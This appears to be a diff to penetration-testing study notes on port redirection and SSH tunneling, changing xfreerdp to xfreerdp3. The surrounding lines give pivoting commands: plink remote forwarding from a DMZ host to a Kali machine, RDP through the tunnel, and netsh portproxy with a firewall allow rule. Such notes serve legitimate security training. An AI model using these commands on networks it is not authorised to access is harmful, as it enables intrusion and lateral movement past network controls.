@@ -124,12 +124,12 @@ pagetitle: Port Redirection and SSH Tunneling
 - Download plink.exe using same command as above ^^
 - `plink.exe -ssh -l kali -pw {pass} -R 127.0.0.1:{kali_port}:127.0.0.1:{port_we_want_to_open_on_DMZ} {kali_ip}`
 	- This is basically just ssh'ing into kali to open up a port on the DMZ machine
-- Then, for example, `xfreerdp /u:{username} /p:{password} /v:127.0.0.1:{kali_port}`, as the box has SSH'd into kali and is running on kali port, so we can rdp into that
+- Then, for example, `xfreerdp3 /u:{username} /p:{password} /v:127.0.0.1:{kali_port}`, as the box has SSH'd into kali and is running on kali port, so we can rdp into that
 
 **Netsh**
 - Built-in to the firewall, thus should require Administrator
 - Assume RDP is open, and we want to go to 1hop internal machine via SSH
-- 1st, rdp using `xfreerdp`
+- 1st, rdp using `xfreerdp3`
 - Then, `netsh interface portproxy add v4tov4 listenport={open_port} listenaddress={current_machine_IP_from_kali} connectport={port_of_1hop_machine} connectaddress={1hop_internal_IP}`
 	- Need to open {open_port} on the firewall - `netsh advfirewall firewall`
 		- `netsh advfirewall firewall add rule name="{any_name}" protocol=TCP dir=in localip={kali_ip} localport={open_port} action=allow`
